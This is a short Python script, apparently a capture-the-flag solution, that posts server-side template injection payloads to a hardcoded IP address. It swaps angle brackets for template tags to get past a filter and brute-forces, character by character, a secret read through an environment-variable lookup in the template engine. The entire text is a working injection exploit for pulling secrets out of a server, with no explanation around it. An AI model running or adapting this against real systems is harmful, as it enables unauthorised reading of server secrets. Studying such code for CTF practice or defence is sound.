import requests

url = "http://123.57.4.116:19726/"
flag = ['']*40

def replace(s:str):
    return s.replace("<","{%").replace(">","%}")

payload ="< for v in get_env(name=\"secret\") >< if v == \'{0}\' >1< else >0< endif >< endfor >"

for i in range(32,128):
    r=requests.post(url=url,data=replace(payload.format(chr(i))))
    content=r.text
    for j in range(len(content)):
        if content[j] == '1':
            flag[j]=chr(i)

for i in range(40):
    print(flag[i],end='')